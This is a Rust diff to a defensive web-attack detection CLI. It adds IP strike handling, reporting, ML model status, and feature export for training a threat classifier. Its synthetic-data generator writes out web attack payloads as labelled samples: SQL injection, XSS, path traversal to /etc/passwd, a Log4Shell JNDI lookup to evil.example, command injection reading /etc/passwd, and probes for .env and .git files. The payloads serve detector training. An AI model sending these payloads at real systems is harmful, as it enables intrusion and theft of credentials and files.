@@ -5,6 +5,8 @@
 //! message instead of crashing.
 
 use crate::cli::*;
+#[cfg(feature = "onnx")]
+use sentry_ai::ThreatModel;
 use sentry_core::config::SentryConfig;
 
 /// Dispatch a parsed CLI invocation with a possibly-loaded config.
@@ -111,6 +113,13 @@ pub async fn dispatch_with_config(cli: Cli, cfg: Option<SentryConfig>) -> color_
                     println!("Unblocked {ip}");
                     notify_rules_changed(&repo).await;
                 }
+                Some(IpCmd::Forgive) => {
+                    repo.ip_state()
+                        .reset_offender(ip_addr)
+                        .await
+                        .map_err(|e| color_eyre::eyre::eyre!("forgive failed: {e}"))?;
+                    println!("Strikes reset for {ip} (total history kept)");
+                }
                 Some(IpCmd::Info) | None => {
                     let is_blocked = repo
                         .ip_state()
@@ -133,6 +142,21 @@ pub async fn dispatch_with_config(cli: Cli, cfg: Option<SentryConfig>) -> color_
                                 .unwrap_or("never".into())
                         );
                         println!("Updated:  {}", row.updated_at);
+                    }
+                    match repo.ip_state().offender(ip_addr).await {
+                        Ok(Some(offender)) => {
+                            println!("Strikes:  {}", offender.strikes);
+                            println!("Total violations: {}", offender.total_violations);
+                            println!(
+                                "Last violation:    {}",
+                                offender
+                                    .last_violation_at
+                                    .map(|t| t.to_string())
+                                    .unwrap_or("-".into())
+                            );
+                        }
+                        Ok(None) => println!("Strikes:  0 (no violations recorded)"),
+                        Err(e) => println!("Strikes:  query failed: {e}"),
                     }
                 }
             }
@@ -428,12 +452,33 @@ pub async fn dispatch_with_config(cli: Cli, cfg: Option<SentryConfig>) -> color_
                 }
             }
         }
-        Command::Report { from, export } => {
+        Command::Report {
+            from,
+            export,
+            unknown_paths,
+        } => {
             let cfg = require_config(&cfg)?;
             let repo = connect_storage(cfg).await?;
             let since = chrono::Utc::now()
                 - parse_duration(&from)
                     .map_err(|e| color_eyre::eyre::eyre!("invalid --from: {e}"))?;
+
+            if unknown_paths {
+                let rows = repo
+                    .events()
+                    .top_unknown_paths(20, since)
+                    .await
+                    .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
+                println!("Top unknown paths flagged `UnknownRoute` (since {since}):");
+                println!("(candidates for [[routes.known]] — the learner never learns these)");
+                if rows.is_empty() {
+                    println!("  (none)");
+                }
+                for (path, n) in &rows {
+                    println!("  {path:<50} {n}");
+                }
+                return Ok(());
+            }
 
             let by_level = repo
                 .events()
@@ -551,16 +596,103 @@ pub async fn dispatch_with_config(cli: Cli, cfg: Option<SentryConfig>) -> color_
         },
         Command::Model { action } => match action {
             ModelCmd::Status => {
-                println!("Model: ONNX threat model (F2 — not yet loaded)");
+                let ai = cfg.as_ref().map(|c| &c.ai);
+                println!("Model: classic ML (ONNX) — fork stage");
+                match ai {
+                    Some(ai) => {
+                        println!("Enabled:  {}", ai.enabled);
+                        println!("Path:     {}", ai.model_path.display());
+                        println!(
+                            "Mode:     {} (trigger: {}, min score {})",
+                            ai.mode, ai.trigger, ai.min_score
+                        );
+                        println!(
+                            "Threshold: {:.2}, signal weight: {}",
+                            ai.threshold, ai.signal_weight
+                        );
+                        match ai.model_path.exists() {
+                            true => {
+                                #[cfg(feature = "onnx")]
+                                {
+                                    match sentry_ai::onnx_model::OnnxThreatModel::load(
+                                        &ai.model_path,
+                                        sentry_ai::onnx_model::OnnxThreatModelConfig {
+                                            threshold: ai.threshold,
+                                            signal_weight: ai.signal_weight,
+                                        },
+                                    ) {
+                                        Ok(m) => {
+                                            println!("Loaded:   {} ({})", m.name(), m.describe())
+                                        }
+                                        Err(e) => println!("Loaded:   failed: {e}"),
+                                    }
+                                }
+                                #[cfg(not(feature = "onnx"))]
+                                println!("Loaded:   file present (build sentry-cli with --features onnx to load it)");
+                            }
+                            false => println!(
+                                "Loaded:   no model file (train one with tools/train_model.py)"
+                            ),
+                        }
+                    }
+                    None => println!("Enabled:  false (no config loaded)"),
+                }
                 println!(
-                    "Provider: {}",
+                    "LLM provider: {}",
                     cfg.as_ref()
                         .map(|c| c.llm.provider.as_str())
                         .unwrap_or("none")
                 );
             }
             ModelCmd::Reload => {
-                println!("Model reload not yet implemented (F2).");
+                println!("Model reload happens on daemon restart (hot reload is planned for F3).");
+            }
+            ModelCmd::Export {
+                hours,
+                out,
+                synthetic,
+                rows,
+            } => {
+                if synthetic {
+                    export_synthetic(rows, &out)?;
+                    return Ok(());
+                }
+                let cfg = require_config(&cfg)?;
+                let repo = connect_storage(cfg).await?;
+                let since = chrono::Utc::now() - chrono::Duration::hours(hours as i64);
+                let rows = repo
+                    .events()
+                    .recent_since(since)
+                    .await
+                    .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
+                let mut w = std::io::BufWriter::new(
+                    std::fs::File::create(&out)
+                        .map_err(|e| color_eyre::eyre::eyre!("cannot create {out}: {e}"))?,
+                );
+                use std::io::Write;
+                writeln!(w, "{},label", sentry_ai::FEATURE_NAMES.join(","))
+                    .map_err(|e| color_eyre::eyre::eyre!("write failed: {e}"))?;
+                let mut written = 0u64;
+                for row in &rows {
+                    let Some(evt) = crate::daemon::event_row_to_event(row) else {
+                        continue;
+                    };
+                    // Label: verdicts the pipeline acted on are the positives.
+                    let label =
+                        matches!(row.verdict.as_str(), "block" | "challenge" | "rate_limit") as u8;
+                    let features: Vec<String> = sentry_ai::features::extract(&evt)
+                        .iter()
+                        .map(|f| format!("{f:.6}"))
+                        .collect();
+                    writeln!(w, "{},{}", features.join(","), label)
+                        .map_err(|e| color_eyre::eyre::eyre!("write failed: {e}"))?;
+                    written += 1;
+                }
+                w.flush().ok();
+                println!(
+                    "Exported {written} rows ({hours}h window) to {out} \
+                     — train with: python tools/train_model.py --csv {out}"
+                );
             }
         },
         Command::Cloudflare { action } => match action {
@@ -687,6 +819,188 @@ fn build_cf_provider() -> color_eyre::Result<sentry_action_cloudflare::Cloudflar
 
 async fn notify_rules_changed(repo: &sentry_storage::Repo) {
     let _ = repo.pool().notify("sentry_rules_changed").await;
+}
+
+/// Tiny deterministic LCG (no `rand` dependency for this offline tool).
+struct Lcg(u64);
+
+impl Lcg {
+    fn new(seed: u64) -> Self {
+        Self(seed)
+    }
+    fn next(&mut self) -> u64 {
+        self.0 = self
+            .0
+            .wrapping_mul(6_364_136_223_846_793_005)
+            .wrapping_add(1_442_695_040_888_963_407);
+        self.0 >> 33
+    }
+    fn below(&mut self, n: u64) -> u64 {
+        self.next() % n.max(1)
+    }
+    fn pick<'a>(&mut self, items: &[&'a str]) -> &'a str {
+        items[self.below(items.len() as u64) as usize]
+    }
+    fn alnum(&mut self, len: usize) -> String {
+        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
+        (0..len)
+            .map(|_| CHARSET[self.below(CHARSET.len() as u64) as usize] as char)
+            .collect()
+    }
+}
+
+const BROWSER_UAS: &[&str] = &[
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.5",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+];
+const TOOL_UAS: &[&str] = &[
+    "python-requests/2.32.0",
+    "curl/8.5.0",
+    "sqlmap/1.8",
+    "Go-http-client/2.0",
+    "masscan/1.3",
+];
+
+fn synthetic_event(rng: &mut Lcg, malicious: bool) -> (sentry_core::Event, u8) {
+    let id = rng.below(10_000);
+    let (path, query): (String, Option<String>) = if malicious {
+        match rng.below(16) {
+            0 => ("/login".into(), Some(format!("user='+OR+{id}%3D1--"))),
+            1 => (
+                "/products".into(),
+                Some(format!("id={id}%20UNION%20SELECT%20*%20FROM%20users")),
+            ),
+            2 => (
+                "/search".into(),
+                Some("<script>alert(1)</script>".to_string()),
+            ),
+            3 => ("/../../etc/passwd".into(), None),
+            4 => ("/%2e%2e%2fetc%2fpasswd".into(), None),
+            5 => ("/....//windows/win.ini".into(), None),
+            6 => (
+                "/search".into(),
+                Some("${jndi:ldap://evil.example/a}".to_string()),
+            ),
+            7 => (
+                "/ping".into(),
+                Some(format!("host=;cat /etc/passwd|{}", rng.alnum(4))),
+            ),
+            8 => ("/.env".into(), None),
+            9 => (
+                format!(
+                    "/.env.{}",
+                    rng.pick(&["local", "production", "staging", "test"])
+                ),
+                None,
+            ),
+            10 => ("/.git/config".into(), None),
+            11 => {
+                let len = 3 + rng.below(5) as usize;
+                (
+                    format!("/{}.{}", rng.alnum(len), rng.pick(&["php", "asp", "jsp"])),
+                    None,
+                )
+            }
+            12 => (
+                rng.pick(&[
+                    "/wp-admin/setup-config.php",
+                    "/wp-login.php",
+                    "/phpmyadmin/",
+                    "/adminer.php",
+                ])
+                .to_string(),
+                None,
+            ),
+            13 => (
+                "/index.php".into(),
+                Some("page=php://filter/convert.base64-encode/resource=index".to_string()),
+            ),
+            14 => ("/backup.sql".into(), None),
+            _ => (format!("/{}.bak", rng.alnum(4)), None),
+        }
+    } else {
+        (
+            match rng.below(12) {
+                0 => format!("/api/users/{id}"),
+                1 => format!("/api/users/{id}/posts"),
+                2 => format!("/api/items/{id}"),
+                3 => "/posts".into(),
+                4 => "/health".into(),
+                5 => "/about".into(),
+                6 => format!("/static/v{}css/app.css", rng.below(9)),
+                7 => "/favicon.ico".into(),
+                8 => format!("/docs/{}", rng.pick(&["intro", "api", "guides", "faq"])),
+                9 => "/login".into(),
+                10 => format!("/posts/{}", rng.alnum(6)),
+                _ => "/api/orders".into(),
+            },
+            match rng.below(12) {
+                10 => Some(format!("page={}&sort=asc", rng.below(50))),
+                11 => Some(format!("page={}&limit=25", rng.below(50))),
+                _ => None,
+            },
+        )
+    };
+    let ua = if malicious && rng.below(3) == 0 {
+        rng.pick(TOOL_UAS).to_string()
+    } else {
+        rng.pick(BROWSER_UAS).to_string()
+    };
+    let status = if malicious {
+        [404, 404, 404, 403, 500][rng.below(5) as usize]
+    } else {
+        [200, 200, 200, 200, 301, 404][rng.below(6) as usize]
+    };
+    let evt = sentry_core::Event::new(
+        sentry_core::SourceKind::Synthetic,
+        format!("203.0.113.{}", 1 + rng.below(254)).parse().unwrap(),
+        sentry_core::ProtocolData::Http(sentry_core::HttpData {
+            path,
+            query,
+            method: Some(if rng.below(6) == 0 {
+                sentry_core::HttpMethod::Post
+            } else {
+                sentry_core::HttpMethod::Get
+            }),
+            status: Some(status),
+            user_agent: Some(ua),
+            ..Default::default()
+        }),
+    );
+    (evt, u8::from(malicious))
+}
+
+/// Generate a synthetic seed dataset (features extracted by Rust — same
+/// extractor as inference, so training/inference parity is guaranteed).
+fn export_synthetic(rows: u64, out: &str) -> color_eyre::Result<()> {
+    use std::io::Write;
+    let mut rng = Lcg::new(0x5EED_C0DE);
+    let mut w = std::io::BufWriter::new(
+        std::fs::File::create(out)
+            .map_err(|e| color_eyre::eyre::eyre!("cannot create {out}: {e}"))?,
+    );
+    writeln!(w, "{},label", sentry_ai::FEATURE_NAMES.join(","))
+        .map_err(|e| color_eyre::eyre::eyre!("write failed: {e}"))?;
+    for i in 0..rows.max(2) {
+        let malicious = i >= rows / 2;
+        let (evt, label) = synthetic_event(&mut rng, malicious);
+        let features: Vec<String> = sentry_ai::features::extract(&evt)
+            .iter()
+            .map(|f| format!("{f:.6}"))
+            .collect();
+        writeln!(w, "{},{}", features.join(","), label)
+            .map_err(|e| color_eyre::eyre::eyre!("write failed: {e}"))?;
+    }
+    w.flush().ok();
+    println!(
+        "Exported {rows} synthetic rows ({}/{} malicious) to {out} — train with: \
+         python tools/train_model.py --csv {out}",
+        rows / 2,
+        rows - rows / 2
+    );
+    Ok(())
 }
 
 fn parse_duration(s: &str) -> color_eyre::Result<chrono::Duration> {
